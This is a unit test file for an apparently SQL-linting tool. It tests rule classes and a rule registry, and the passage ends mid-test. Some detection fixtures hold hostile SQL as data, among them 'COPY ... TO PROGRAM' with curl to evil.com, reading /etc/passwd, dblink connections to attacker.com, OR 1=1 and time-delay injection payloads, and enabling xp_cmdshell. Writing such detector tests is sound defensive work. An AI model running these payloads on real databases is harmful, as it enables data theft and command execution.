# tests/unit/test_rules.py
"""
Test rule classes.
"""

import pytest

from slowql.core.models import Category, Dimension, Location, Query, Severity
from slowql.rules.base import ASTRule, PatternRule, Rule
from slowql.rules.catalog import (
    AlterTableDestructiveRule,
    AuditLogTamperingRule,
    AutocommitDisabledRule,
    CommentedCodeRule,
    ConsentTableMissingRule,
    CrossBorderDataTransferRule,
    CrossRegionDataTransferCostRule,
    SecondOrderSQLInjectionRule,
    LikeWildcardInjectionRule,
    WeakHashingAlgorithmRule,
    PlaintextPasswordInQueryRule,
    HardcodedEncryptionKeyRule,
    WeakEncryptionAlgorithmRule,
    PrivilegeEscalationRoleGrantRule,
    SchemaOwnershipChangeRule,
    HorizontalAuthorizationBypassRule,
    SensitiveDataInErrorOutputRule,
    AuditTrailManipulationRule,
    InsecureSessionTokenStorageRule,
    SessionTimeoutNotEnforcedRule,
    UnboundedRecursiveCTERule,
    RegexDenialOfServiceRule,
    DangerousServerConfigRule,
    DataExfiltrationViaFileRule,
    DuplicateConditionRule,
    DynamicSQLExecutionRule,
    ExceptionSwallowedRule,
    ExpensiveWindowFunctionRule,
    FullTableScanRule,
    GrantToPublicRule,
    HardcodedDateRule,
    HardcodedPasswordRule,
    LeadingWildcardRule,
    LongTransactionWithoutSavepointRule,
    MissingAliasRule,
    MissingRollbackRule,
    NullComparisonRule,
    OverprivilegedExecutionContextRule,
    PasswordPolicyBypassRule,
    PIIExposureRule,
    RedundantOrderByRule,
    RemoteDataAccessRule,
    RetentionPolicyMissingRule,
    RightToErasureRule,
    SelectStarInETLRule,
    SelectStarRule,
    SQLInjectionRule,
    TautologicalOrConditionRule,
    TimeBasedBlindInjectionRule,
    TruncateWithoutTransactionRule,
    UnencryptedSensitiveColumnRule,
    UnionWithoutAllRule,
    UnsafeWriteRule,
    UserCreationWithoutPasswordRule,
    WildcardInColumnListRule,
    ImplicitTypeConversionRule,
    CompositeIndexOrderViolationRule,
    NonSargableOrConditionRule,
    CoalesceOnIndexedColumnRule,
    NegationOnIndexedColumnRule,
    TableLockHintRule,
    ReadUncommittedHintRule,
    LongTransactionPatternRule,
    MissingTransactionIsolationRule,
    CursorDeclarationRule,
    WhileLoopPatternRule,
    NestedLoopJoinHintRule,
    LargeInClauseRule,
    UnboundedTempTableRule,
    OrderByWithoutLimitInSubqueryRule,
    GroupByHighCardinalityRule,
    QueryOptimizerHintRule,
    IndexHintRule,
    ParallelQueryHintRule,
    ScalarUdfInQueryRule,
    CorrelatedSubqueryRule,
    OrderByNonIndexedColumnRule,
    LargeUnbatchedOperationRule,
    MissingBatchSizeInLoopRule,
    ExcessiveColumnCountRule,
    LargeObjectUnboundedRule,

    PHIAccessWithoutAuditRule,
    PHIMinimumNecessaryRule,
    UnencryptedPHITransitRule,
    PANExposureRule,
    CVVStorageRule,
    CardholderDataRetentionRule,
    FinancialChangeTrackingRule,
    SegregationOfDutiesRule,
    DataExportCompletenessRule,
    ConsentWithdrawalRule,
    CCPAOptOutRule,
    NonIdempotentInsertRule,
    NonIdempotentUpdateRule,
    ReadModifyWriteLockingRule,
    TOCTOUPatternRule,
    OrphanRecordRiskRule,
    CascadeDeleteRiskRule,
    DeadlockPatternRule,
    LockEscalationRiskRule,
    LongRunningQueryRiskRule,
    StaleReadRiskRule,
    MissingRetryLogicRule,

    OffsetPaginationWithoutCoveringIndexRule,
    DeepPaginationWithoutCursorRule,
    CountStarForPaginationRule,
    DuplicateIndexSignalRule,
    OverIndexedTableSignalRule,
    MissingCoveringIndexOpportunityRule,
    RedundantIndexColumnOrderRule,
    CrossDatabaseJoinRule,
    MultiRegionQueryLatencyRule,
    DistributedTransactionOverheadRule,
    ColdStartQueryPatternRule,
    UnnecessaryConnectionPoolingRule,
    OldDataNotArchivedRule,
    LargeTextColumnWithoutCompressionRule,
    LargeTableWithoutPartitioningRule,

    LDAPInjectionRule,
    NoSQLInjectionRule,
    XMLXPathInjectionRule,
    ServerSideTemplateInjectionRule,
    JSONFunctionInjectionRule,
    DatabaseVersionDisclosureRule,
    SchemaInformationDisclosureRule,
    TimingAttackPatternRule,
    VerboseErrorMessageDisclosureRule,
    OSCommandInjectionRule,
    PathTraversalRule,
    LocalFileInclusionRule,
    SSRFViaDatabaseRule,
    HardcodedCredentialsRule,
    WeakSSLConfigRule,
    DefaultCredentialUsageRule,
    OverlyPermissiveAccessRule,

    get_all_rules,
)
from slowql.rules.registry import RuleRegistry, get_rule_registry


def _make_query(sql: str) -> Query:
    """Helper to create a Query object from raw SQL for pattern rule testing."""
    import sqlglot
    ast = None
    try:
        ast = sqlglot.parse_one(sql)
    except Exception:
        pass

    return Query(
        raw=sql,
        normalized=sql,
        dialect="mysql",
        location=Location(line=1, column=1),
        ast=ast,
        query_type=ast.key.upper() if ast and hasattr(ast, "key") else None,
    )



class TestRule:
    def test_rule_is_abstract(self):
        # Rule is abstract and cannot be instantiated directly
        try:
            Rule()
            raise AssertionError("Should not be able to instantiate abstract class")
        except TypeError:
            pass


class TestPatternRule:
    def test_pattern_rule_creation(self):
        rule = PatternRule()
        assert rule.pattern == ""
        assert rule.message_template == "Pattern matched: {match}"

    def test_pattern_rule_check_no_pattern(self):
        rule = PatternRule()
        query = Query(
            raw="SELECT *",
            normalized="SELECT *",
            dialect="mysql",
            location=Location(line=1, column=1),
        )
        issues = rule.check(query)
        assert issues == []


class TestASTRule:
    def test_ast_rule_is_abstract(self):
        # ASTRule is abstract and cannot be instantiated directly
        try:
            ASTRule()
            raise AssertionError("Should not be able to instantiate abstract class")
        except TypeError:
            pass


class TestSQLInjectionRule:
    def test_sql_injection_rule_creation(self):
        rule = SQLInjectionRule()
        assert rule.id == "SEC-INJ-001"
        assert rule.name == "Potential SQL Injection"
        assert rule.severity == Severity.CRITICAL
        assert rule.dimension == Dimension.SECURITY

    def test_sql_injection_rule_check(self):
        rule = SQLInjectionRule()
        query = Query(
            raw="SELECT * FROM users WHERE id = ' + user_input + '",
            normalized="SELECT * FROM users WHERE id = ' + user_input + '",
            dialect="mysql",
            location=Location(line=1, column=1),
        )
        issues = rule.check(query)
        assert len(issues) > 0


class TestHardcodedPasswordRule:
    def test_hardcoded_password_rule_creation(self):
        rule = HardcodedPasswordRule()
        assert rule.id == "SEC-AUTH-001"
        assert rule.name == "Hardcoded Password"
        assert rule.severity == Severity.HIGH

    def test_hardcoded_password_rule_check(self):
        rule = HardcodedPasswordRule()
        query = Query(
            raw="SELECT * FROM users WHERE password = 'secret123'",
            normalized="SELECT * FROM users WHERE password = 'secret123'",
            dialect="mysql",
            location=Location(line=1, column=1),
        )
        issues = rule.check(query)
        assert len(issues) > 0


class TestSelectStarRule:
    def test_select_star_rule_creation(self):
        rule = SelectStarRule()
        assert rule.id == "PERF-SCAN-001"
        assert rule.name == "SELECT * Usage"
        assert rule.severity == Severity.MEDIUM

    def test_select_star_rule_check(self):
        rule = SelectStarRule()
        query = Query(
            raw="SELECT * FROM users",
            normalized="SELECT * FROM users",
            dialect="mysql",
            location=Location(line=1, column=1),
        )
        rule.check(query)
        # This would require AST parsing, so may not work without proper setup


class TestLeadingWildcardRule:
    def test_leading_wildcard_rule_creation(self):
        rule = LeadingWildcardRule()
        assert rule.id == "PERF-IDX-002"
        assert rule.name == "Leading Wildcard Search"

    def test_leading_wildcard_rule_check(self):
        rule = LeadingWildcardRule()
        query = Query(
            raw="SELECT * FROM users WHERE name LIKE '%john'",
            normalized="SELECT * FROM users WHERE name LIKE '%john'",
            dialect="mysql",
            location=Location(line=1, column=1),
        )
        issues = rule.check(query)
        assert len(issues) > 0


class TestUnsafeWriteRule:
    def test_unsafe_write_rule_creation(self):
        rule = UnsafeWriteRule()
        assert rule.id == "REL-DATA-001"
        assert rule.name == "Catastrophic Data Loss Risk"
        assert rule.severity == Severity.CRITICAL

    def test_unsafe_write_rule_check(self):
        rule = UnsafeWriteRule()
        query = Query(
            raw="DELETE FROM users",
            normalized="DELETE FROM users",
            dialect="mysql",
            location=Location(line=1, column=1),
        )
        rule.check(query)
        # Would require AST parsing


class TestPIIExposureRule:
    def test_pii_exposure_rule_creation(self):
        rule = PIIExposureRule()
        assert rule.id == "COMP-GDPR-001"
        assert rule.name == "Potential PII Selection"

    def test_pii_exposure_rule_check(self):
        rule = PIIExposureRule()
        query = Query(
            raw="SELECT email FROM users",
            normalized="SELECT email FROM users",
            dialect="mysql",
            location=Location(line=1, column=1),
        )
        issues = rule.check(query)
        assert len(issues) > 0

    def test_pii_exposure_rule_check_ssn(self):
        rule = PIIExposureRule()
        query = Query(
            raw="SELECT ssn FROM users",
            normalized="SELECT ssn FROM users",
            dialect="mysql",
            location=Location(line=1, column=1),
        )
        issues = rule.check(query)
        assert len(issues) > 0

    def test_pii_exposure_rule_check_no_pii(self):
        rule = PIIExposureRule()
        query = Query(
            raw="SELECT id, name FROM users",
            normalized="SELECT id, name FROM users",
            dialect="mysql",
            location=Location(line=1, column=1),
        )
        issues = rule.check(query)
        assert len(issues) == 0


def test_get_all_rules():
    """Test that get_all_rules returns all built-in rules."""
    rules = get_all_rules()
    assert isinstance(rules, list)
    assert len(rules) > 0

    # Check that we have rules from different categories
    rule_ids = [rule.id for rule in rules]
    assert any(id.startswith("SEC-") for id in rule_ids)  # Security rules
    assert any(id.startswith("PERF-") for id in rule_ids)  # Performance rules
    assert any(id.startswith("REL-") for id in rule_ids)  # Reliability rules
    assert any(id.startswith("COMP-") for id in rule_ids)  # Compliance rules
    assert any(id.startswith("QUAL-") for id in rule_ids)  # Quality rules


# Test rule classes for registry testing
class SecurityRuleHelper(PatternRule):
    id = "TEST-SEC-001"
    name = "Test Security Rule"
    description = "A test security rule"
    dimension = Dimension.SECURITY
    severity = Severity.HIGH
    category = Category.SEC_INJECTION
    pattern = r"test"
    message_template = "Test security issue found"


class PerformanceRuleHelper(PatternRule):
    id = "TEST-PERF-001"
    name = "Test Performance Rule"
    description = "A test performance rule"
    dimension = Dimension.PERFORMANCE
    severity = Severity.MEDIUM
    pattern = r"test"
    message_template = "Test performance issue found"


class DisabledRuleHelper(PatternRule):
    id = "TEST-DISABLED-001"
    name = "Test Disabled Rule"
    description = "A test disabled rule"
    dimension = Dimension.QUALITY
    severity = Severity.LOW
    pattern = r"test"
    message_template = "Test disabled issue found"
    enabled = False


class TestRuleRegistry:
    """Test RuleRegistry class."""

    def test_init(self):
        """Test RuleRegistry initialization."""
        registry = RuleRegistry()
        assert len(registry) == 0
        assert registry._rules == {}
        assert all(len(ids) == 0 for ids in registry._by_dimension.values())
        assert all(len(ids) == 0 for ids in registry._by_category.values())
        assert all(len(ids) == 0 for ids in registry._by_severity.values())

    def test_register_new_rule(self):
        """Test registering a new rule."""
        registry = RuleRegistry()
        rule = SecurityRuleHelper()

        registry.register(rule)

        assert len(registry) == 1
        assert "TEST-SEC-001" in registry
        assert registry.get("TEST-SEC-001") == rule

    def test_register_rule_without_id(self):
        """Test registering a rule without an ID."""
        class NoIdRule(PatternRule):
            pass  # No id attribute

        registry = RuleRegistry()
        rule = NoIdRule()

        with pytest.raises(ValueError, match="Rule must have an ID"):
            registry.register(rule)

    def test_register_duplicate_rule(self):
        """Test registering a duplicate rule without replace flag."""
        registry = RuleRegistry()
        rule1 = SecurityRuleHelper()
        rule2 = SecurityRuleHelper()  # Same ID

        registry.register(rule1)
        with pytest.raises(ValueError, match="Rule 'TEST-SEC-001' is already registered"):
            registry.register(rule2)

    def test_register_duplicate_rule_with_replace(self):
        """Test registering a duplicate rule with replace flag."""
        class TestSecurityRule2(PatternRule):
            id = "TEST-SEC-001"
            name = "Test Security Rule 2"
            description = "A test security rule 2"
            dimension = Dimension.SECURITY
            severity = Severity.HIGH
            category = Category.SEC_INJECTION
            pattern = r"test2"
            message_template = "Test security issue found 2"

        registry = RuleRegistry()
        rule1 = SecurityRuleHelper()
        rule2 = TestSecurityRule2()

        registry.register(rule1)
        registry.register(rule2, replace=True)

        assert len(registry) == 1
        assert registry.get("TEST-SEC-001") == rule2

    def test_unregister_existing_rule(self):
        """Test unregistering an existing rule."""
        registry = RuleRegistry()
        rule = SecurityRuleHelper()

        registry.register(rule)
        assert len(registry) == 1

        removed_rule = registry.unregister("TEST-SEC-001")
        assert removed_rule == rule
        assert len(registry) == 0
        assert "TEST-SEC-001" not in registry

    def test_unregister_nonexistent_rule(self):
        """Test unregistering a nonexistent rule."""
        registry = RuleRegistry()
        removed_rule = registry.unregister("NONEXISTENT")
        assert removed_rule is None

    def test_get_rule_info(self):
        """Test getting rule info."""
        registry = RuleRegistry()
        rule = SecurityRuleHelper()

        registry.register(rule)
        info = registry.get_rule_info("TEST-SEC-001")

        assert info is not None
        assert info["id"] == "TEST-SEC-001"
        assert info["name"] == "Test Security Rule"

    def test_get_rule_info_nonexistent(self):
        """Test getting rule info for nonexistent rule."""
        registry = RuleRegistry()
        info = registry.get_rule_info("NONEXISTENT")
        assert info is None

    def test_get_all(self):
        """Test getting all rules."""
        registry = RuleRegistry()
        rule1 = SecurityRuleHelper()
        rule2 = PerformanceRuleHelper()

        registry.register(rule1)
        registry.register(rule2)

        all_rules = registry.get_all()
        assert len(all_rules) == 2
        assert all_rules[0].id == "TEST-PERF-001"
        assert all_rules[1].id == "TEST-SEC-001"

    def test_get_by_dimension(self):
        """Test getting rules by dimension."""
        registry = RuleRegistry()
        rule1 = SecurityRuleHelper()
        rule2 = PerformanceRuleHelper()

        registry.register(rule1)
        registry.register(rule2)

        security_rules = registry.get_by_dimension(Dimension.SECURITY)
        assert len(security_rules) == 1
        assert security_rules[0].id == "TEST-SEC-001"

        performance_rules = registry.get_by_dimension(Dimension.PERFORMANCE)
        assert len(performance_rules) == 1
        assert performance_rules[0].id == "TEST-PERF-001"

    def test_get_by_category(self):
        """Test getting rules by category."""
        registry = RuleRegistry()
        rule1 = SecurityRuleHelper()
        rule2 = PerformanceRuleHelper()

        registry.register(rule1)
        registry.register(rule2)

        injection_rules = registry.get_by_category(Category.SEC_INJECTION)
        assert len(injection_rules) == 1
        assert injection_rules[0].id == "TEST-SEC-001"

    def test_get_by_severity(self):
        """Test getting rules by severity."""
        registry = RuleRegistry()
        rule1 = SecurityRuleHelper()
        rule2 = PerformanceRuleHelper()

        registry.register(rule1)
        registry.register(rule2)

        high_rules = registry.get_by_severity(Severity.HIGH)
        assert len(high_rules) == 1
        assert high_rules[0].id == "TEST-SEC-001"

        medium_rules = registry.get_by_severity(Severity.MEDIUM)
        assert len(medium_rules) == 1
        assert medium_rules[0].id == "TEST-PERF-001"

    def test_get_by_prefix(self):
        """Test getting rules by prefix."""
        class SecRule(PatternRule):
            id = "SEC-001"
            name = "Security Rule 1"
            dimension = Dimension.SECURITY
            severity = Severity.HIGH
            category = Category.SEC_INJECTION
            pattern = r"test1"

        class PerfRule(PatternRule):
            id = "PERF-001"
            name = "Performance Rule 1"
            dimension = Dimension.PERFORMANCE
            severity = Severity.MEDIUM
            pattern = r"test2"

        registry = RuleRegistry()
        rule1 = SecRule()
        rule2 = PerfRule()

        registry.register(rule1)
        registry.register(rule2)

        sec_rules = registry.get_by_prefix("SEC")
        assert len(sec_rules) == 1
        assert sec_rules[0].id == "SEC-001"

        perf_rules = registry.get_by_prefix("perf")  # Case insensitive
        assert len(perf_rules) == 1
        assert perf_rules[0].id == "PERF-001"

    def test_get_enabled(self):
        """Test getting enabled rules."""
        registry = RuleRegistry()
        rule1 = SecurityRuleHelper()
        rule2 = DisabledRuleHelper()  # This rule is disabled by default

        registry.register(rule1)
        registry.register(rule2)

        enabled_rules = registry.get_enabled()
        assert len(enabled_rules) == 1
        assert enabled_rules[0].id == "TEST-SEC-001"

    def test_list_all(self):
        """Test listing all rules."""
        registry = RuleRegistry()
        rule = SecurityRuleHelper()

        registry.register(rule)
        rule_list = registry.list_all()

        assert len(rule_list) == 1
        assert rule_list[0]["id"] == "TEST-SEC-001"
        assert rule_list[0]["name"] == "Test Security Rule"

    def test_search(self):
        """Test searching rules."""
        class InjectionRule(PatternRule):
            id = "SEC-INJ-001"
            name = "SQL Injection"
            description = "Detects SQL injection"
            dimension = Dimension.SECURITY
            severity = Severity.CRITICAL
            category = Category.SEC_INJECTION
            pattern = r"injection"
            enabled = True

        class IndexRule(PatternRule):
            id = "PERF-IDX-001"
            name = "Index Usage"
            description = "Checks index usage"
            dimension = Dimension.PERFORMANCE
            severity = Severity.MEDIUM
            pattern = r"index"
            enabled = True

        registry = RuleRegistry()
        rule1 = InjectionRule()
        rule2 = IndexRule()

        registry.register(rule1)
        registry.register(rule2)

        # Search by query
        results = registry.search("injection")
        assert len(results) == 1
        assert results[0].id == "SEC-INJ-001"

        # Search by dimension
        results = registry.search("", dimensions=[Dimension.SECURITY])
        assert len(results) == 1
        assert results[0].id == "SEC-INJ-001"

        # Search by severity
        results = registry.search("", severities=[Severity.CRITICAL])
        assert len(results) == 1
        assert results[0].id == "SEC-INJ-001"

        # Search enabled only
        registry.register(DisabledRuleHelper())  # Add a disabled rule
        results = registry.search("", enabled_only=True)
        assert len(results) == 2  # Both InjectionRule and IndexRule are enabled
        rule_ids = [r.id for r in results]
        assert "SEC-INJ-001" in rule_ids
        assert "PERF-IDX-001" in rule_ids

    def test_stats(self):
        """Test getting registry statistics."""
        registry = RuleRegistry()
        rule1 = SecurityRuleHelper()
        rule2 = DisabledRuleHelper()  # This rule is disabled

        registry.register(rule1)
        registry.register(rule2)

        stats = registry.stats()
        assert stats["total"] == 2
        assert stats["enabled"] == 1
        assert stats["disabled"] == 1
        assert stats["by_dimension"]["security"] == 1
        assert stats["by_dimension"]["quality"] == 1
        assert stats["by_severity"]["high"] == 1
        assert stats["by_severity"]["low"] == 1
        assert stats["by_category"]["injection"] == 1

    def test_clear(self):
        """Test clearing the registry."""
        registry = RuleRegistry()
        rule = SecurityRuleHelper()

        registry.register(rule)
        assert len(registry) == 1

        registry.clear()
        assert len(registry) == 0

    def test_contains(self):
        """Test __contains__ method."""
        registry = RuleRegistry()
        rule = SecurityRuleHelper()

        registry.register(rule)

        assert "TEST-SEC-001" in registry
        assert "NONEXISTENT" not in registry

    def test_iter(self):
        """Test __iter__ method."""
        registry = RuleRegistry()
        rule1 = SecurityRuleHelper()
        rule2 = PerformanceRuleHelper()

        registry.register(rule1)
        registry.register(rule2)

        rules = list(registry)
        assert len(rules) == 2
        # Should be sorted by ID
        assert rules[0].id == "TEST-PERF-001"
        assert rules[1].id == "TEST-SEC-001"


class TestGlobalRegistry:
    """Test global registry functions."""

    def test_get_rule_registry(self):
        """Test getting the global rule registry."""
        registry = get_rule_registry()
        assert registry is not None
        # Should return the same instance on subsequent calls
        registry2 = get_rule_registry()
        assert registry is registry2


# =============================================================================
# Security Rule Tests (Extended)
# =============================================================================


class TestDynamicSQLExecutionRule:
    def setup_method(self):
        self.rule = DynamicSQLExecutionRule()

    # Should match
    def test_exec_with_concatenation(self):
        assert self.rule.check(_make_query("EXEC('SELECT * FROM users WHERE id = ' + @userId)"))

    def test_execute_with_parens(self):
        assert self.rule.check(_make_query("EXECUTE(@sql)"))

    def test_sp_executesql(self):
        assert self.rule.check(_make_query("EXEC sp_executesql @dynamicQuery"))

    def test_execute_immediate(self):
        assert self.rule.check(_make_query("EXECUTE IMMEDIATE 'SELECT * FROM ' || table_name"))

    def test_prepare_from_variable(self):
        assert self.rule.check(_make_query("PREPARE stmt FROM @sql_string"))

    def test_prepare_from_concat(self):
        assert self.rule.check(_make_query("PREPARE stmt FROM CONCAT('SELECT * FROM ', @tbl)"))

    # Should NOT match
    def test_static_procedure_call(self):
        assert not self.rule.check(_make_query("EXEC sp_help 'users'"))

    def test_parameterized_procedure(self):
        assert not self.rule.check(_make_query("EXECUTE myStoredProcedure @param1"))

    def test_normal_parameterized_query(self):
        assert not self.rule.check(_make_query("SELECT * FROM users WHERE id = @id"))


class TestTautologicalOrConditionRule:
    def setup_method(self):
        self.rule = TautologicalOrConditionRule()

    # Should match
    def test_or_1_equals_1(self):
        assert self.rule.check(_make_query("SELECT * FROM users WHERE username = 'admin' OR 1=1"))

    def test_or_string_equals_string(self):
        assert self.rule.check(_make_query("DELETE FROM logs WHERE 'a'='a' OR 'x'='x'"))

    def test_or_true(self):
        assert self.rule.check(_make_query("SELECT * FROM accounts WHERE id = 5 OR TRUE"))

    def test_or_1_equals_1_with_spaces(self):
        assert self.rule.check(_make_query("SELECT * FROM users WHERE id = 1 OR 1 = 1"))

    # Should NOT match
    def test_normal_where(self):
        assert not self.rule.check(_make_query("SELECT * FROM users WHERE id = 1"))

    def test_where_1_equals_1_no_or(self):
        assert not self.rule.check(_make_query("SELECT * FROM users WHERE 1=1"))

    def test_boolean_column(self):
        assert not self.rule.check(_make_query("SELECT * FROM users WHERE active = TRUE AND role = 'admin'"))

    def test_count_equals_1(self):
        assert not self.rule.check(_make_query("SELECT * FROM users WHERE count = 1"))


class TestTimeBasedBlindInjectionRule:
    def setup_method(self):
        self.rule = TimeBasedBlindInjectionRule()

    # Should match
    def test_waitfor_delay(self):
        assert self.rule.check(_make_query("SELECT * FROM users WHERE id = 1; WAITFOR DELAY '0:0:5'"))

    def test_sleep(self):
        assert self.rule.check(_make_query("SELECT * FROM users WHERE id = 1 AND SLEEP(5)"))

    def test_pg_sleep(self):
        assert self.rule.check(_make_query("SELECT * FROM users WHERE id = 1 AND pg_sleep(5)"))

    def test_benchmark(self):
        assert self.rule.check(_make_query("SELECT BENCHMARK(10000000, SHA1('test'))"))

    def test_injection_payload(self):
        assert self.rule.check(_make_query("' OR 1=1; WAITFOR DELAY '0:0:10' --"))

    # Should NOT match
    def test_sleep_column_name(self):
        assert not self.rule.check(_make_query("SELECT sleep_duration FROM config WHERE id = 1"))

    def test_benchmark_table(self):
        assert not self.rule.check(_make_query("SELECT * FROM benchmarks WHERE score > 90"))

    def test_delay_as_value(self):
        assert not self.rule.check(_make_query("INSERT INTO delay_log (seconds) VALUES (5)"))

    def test_pg_stat(self):
        assert not self.rule.check(_make_query("SELECT pg_stat_activity FROM pg_catalog.pg_stat_activity"))


class TestGrantToPublicRule:
    def setup_method(self):
        self.rule = GrantToPublicRule()

    # Should match
    def test_grant_select_to_public(self):
        assert self.rule.check(_make_query("GRANT SELECT ON customers TO PUBLIC"))

    def test_grant_execute_to_public(self):
        assert self.rule.check(_make_query("GRANT EXECUTE ON dbo.myProc TO PUBLIC"))

    def test_grant_multiple_to_public(self):
        assert self.rule.check(_make_query("GRANT INSERT, UPDATE ON orders TO PUBLIC"))

    # Should NOT match
    def test_grant_to_specific_role(self):
        assert not self.rule.check(_make_query("GRANT SELECT ON customers TO app_readonly"))

    def test_revoke_from_public(self):
        assert not self.rule.check(_make_query("REVOKE SELECT ON customers FROM PUBLIC"))

    def test_grant_all_to_user(self):
        assert not self.rule.check(_make_query("GRANT ALL PRIVILEGES ON *.* TO 'admin'@'localhost'"))


class TestUserCreationWithoutPasswordRule:
    def setup_method(self):
        self.rule = UserCreationWithoutPasswordRule()

    # Should match
    def test_create_user_no_password(self):
        assert self.rule.check(_make_query("CREATE USER guest"))

    def test_create_user_for_login(self):
        assert self.rule.check(_make_query("CREATE USER readonly FOR LOGIN readonly_login"))

    def test_create_login_no_password(self):
        assert self.rule.check(_make_query("CREATE LOGIN app_service WITH DEFAULT_DATABASE = mydb"))

    # Should NOT match
    def test_create_user_identified_by(self):
        assert not self.rule.check(_make_query("CREATE USER admin IDENTIFIED BY 'strongPass123!'"))

    def test_create_login_with_password(self):
        assert not self.rule.check(_make_query("CREATE LOGIN app_user WITH PASSWORD = 'secureP@ss'"))

    def test_create_user_mysql_identified(self):
        assert not self.rule.check(_make_query("CREATE USER 'webapp'@'localhost' IDENTIFIED BY 'pass123'"))


class TestPasswordPolicyBypassRule:
    def setup_method(self):
        self.rule = PasswordPolicyBypassRule()

    # Should match
    def test_check_policy_off(self):
        assert self.rule.check(_make_query("CREATE LOGIN weak_user WITH PASSWORD = 'test', CHECK_POLICY = OFF"))

    def test_check_expiration_off(self):
        assert self.rule.check(_make_query("ALTER LOGIN svc_account WITH CHECK_EXPIRATION = OFF"))

    def test_both_off(self):
        assert self.rule.check(_make_query("CREATE LOGIN bulk_svc WITH PASSWORD = 'x', CHECK_POLICY = OFF, CHECK_EXPIRATION = OFF"))

    # Should NOT match
    def test_policy_on(self):
        assert not self.rule.check(_make_query("CREATE LOGIN secure_user WITH PASSWORD = 'Str0ng!', CHECK_POLICY = ON"))

    def test_expiration_on(self):
        assert not self.rule.check(_make_query("ALTER LOGIN svc_account WITH CHECK_EXPIRATION = ON"))

    def test_no_policy_clause(self):
        assert not self.rule.check(_make_query("CREATE LOGIN app WITH PASSWORD = 'complex123!'"))


class TestDataExfiltrationViaFileRule:
    def setup_method(self):
        self.rule = DataExfiltrationViaFileRule()

    # Should match
    def test_into_outfile(self):
        assert self.rule.check(_make_query("SELECT * FROM users INTO OUTFILE '/tmp/users.csv'"))

    def test_into_dumpfile(self):
        assert self.rule.check(_make_query("SELECT password FROM accounts INTO DUMPFILE '/tmp/dump.txt'"))

    def test_load_file(self):
        assert self.rule.check(_make_query("SELECT LOAD_FILE('/etc/passwd')"))

    def test_load_data_infile(self):
        assert self.rule.check(_make_query("LOAD DATA INFILE '/tmp/data.csv' INTO TABLE staging"))

    def test_bulk_insert(self):
        assert self.rule.check(_make_query("BULK INSERT staging FROM '\\\\server\\share\\data.csv'"))

    def test_copy_from_program(self):
        assert self.rule.check(_make_query("COPY users FROM PROGRAM 'cat /etc/passwd'"))

    def test_copy_to_program(self):
        assert self.rule.check(_make_query("COPY users TO PROGRAM 'curl http://evil.com/exfil'"))

    # Should NOT match
    def test_outfile_as_column_value(self):
        assert not self.rule.check(_make_query("SELECT * FROM users WHERE file_path = '/tmp/users.csv'"))

    def test_insert_file_path(self):
        assert not self.rule.check(_make_query("INSERT INTO file_log (path) VALUES ('/tmp/data.csv')"))

    def test_outfiles_table_name(self):
        assert not self.rule.check(_make_query("SELECT * FROM outfiles WHERE status = 'active'"))


class TestRemoteDataAccessRule:
    def setup_method(self):
        self.rule = RemoteDataAccessRule()

    # Should match
    def test_openrowset(self):
        assert self.rule.check(_make_query("SELECT * FROM OPENROWSET('SQLOLEDB', 'Server=evil.com', 'SELECT * FROM passwords')"))

    def test_opendatasource(self):
        assert self.rule.check(_make_query("SELECT * FROM OPENDATASOURCE('SQLOLEDB', '...').master.dbo.sysdatabases"))

    def test_openquery(self):
        assert self.rule.check(_make_query("SELECT * FROM OPENQUERY(LinkedServer, 'SELECT * FROM sensitive_data')"))

    def test_dblink(self):
        assert self.rule.check(_make_query("SELECT * FROM dblink('host=remote dbname=prod', 'SELECT * FROM users') AS t(id int)"))

    def test_dblink_connect(self):
        assert self.rule.check(_make_query("SELECT dblink_connect('myconn', 'host=attacker.com dbname=exfil')"))

    def test_dblink_exec(self):
        assert self.rule.check(_make_query("SELECT dblink_exec('myconn', 'DROP TABLE users')"))

    # Should NOT match
    def test_openrowset_as_string(self):
        assert not self.rule.check(_make_query("SELECT * FROM users WHERE source = 'OPENROWSET'"))

    def test_dblink_as_string(self):
        assert not self.rule.check(_make_query("SELECT * FROM link_tracking WHERE type = 'dblink'"))

    def test_audit_log_mention(self):
        assert not self.rule.check(_make_query("INSERT INTO audit_log (action) VALUES ('openquery executed')"))


class TestDangerousServerConfigRule:
    def setup_method(self):
        self.rule = DangerousServerConfigRule()

    # Should match
    def test_xp_cmdshell(self):
        assert self.rule.check(_make_query("EXEC sp_configure 'xp_cmdshell', 1"))

    def test_ole_automation(self):
        assert self.rule.check(_make_query("EXEC sp_configure 'Ole Automation Procedures', 1"))

    def test_clr_enabled(self):
        assert self.rule.check(_make_query("EXEC sp_configure 'clr enabled', 1"))

    def test_ad_hoc_distributed(self):
        assert self.rule.check(_make_query("EXEC sp_configure 'Ad Hoc Distributed Queries', 1"))

    # Should NOT match
    def test_safe_config(self):
        assert not self.rule.check(_make_query("EXEC sp_configure 'max degree of parallelism', 8"))

    def test_cost_threshold(self):
        assert not self.rule.check(_make_query("EXEC sp_configure 'cost threshold for parallelism', 50"))

    def test_sp_help(self):
        assert not self.rule.check(_make_query("EXEC sp_help 'users'"))

    def test_select_config(self):
        assert not self.rule.check(_make_query("SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell'"))


class TestOverprivilegedExecutionContextRule:
    def setup_method(self):
        self.rule = OverprivilegedExecutionContextRule()

    # Should match
    def test_execute_as_dbo(self):
        assert self.rule.check(_make_query("CREATE PROCEDURE dbo.admin_proc WITH EXECUTE AS 'dbo' AS BEGIN SELECT 1 END"))

    def test_execute_as_sa(self):
        assert self.rule.check(_make_query("CREATE PROCEDURE get_data WITH EXECUTE AS 'sa' AS SELECT * FROM secrets"))

    def test_execute_as_user_dbo(self):
        assert self.rule.check(_make_query("EXECUTE AS USER = 'dbo'"))

    def test_execute_as_login_sa(self):
        assert self.rule.check(_make_query("EXECUTE AS LOGIN = 'sa'"))

    def test_security_definer(self):
        assert self.rule.check(_make_query("CREATE FUNCTION admin_fn() RETURNS void LANGUAGE SQL SECURITY DEFINER AS $$SELECT 1$$"))

    def test_with_admin_option(self):
        assert self.rule.check(_make_query("GRANT ROLE admin_role TO user1 WITH ADMIN OPTION"))

    def test_with_grant_option(self):
        assert self.rule.check(_make_query("GRANT SELECT ON users TO app_user WITH GRANT OPTION"))

    def test_execute_as_owner(self):
        assert self.rule.check(_make_query("ALTER PROCEDURE myProc WITH EXECUTE AS OWNER"))

    # Should NOT match
    def test_simple_create_procedure(self):
        assert not self.rule.check(_make_query("CREATE PROCEDURE safe_proc AS BEGIN SELECT 1 END"))

    def test_security_invoker(self):
        assert not self.rule.check(_make_query("CREATE FUNCTION calc(x INT) RETURNS INT LANGUAGE SQL SECURITY INVOKER AS $$SELECT x$$"))

    def test_normal_grant(self):
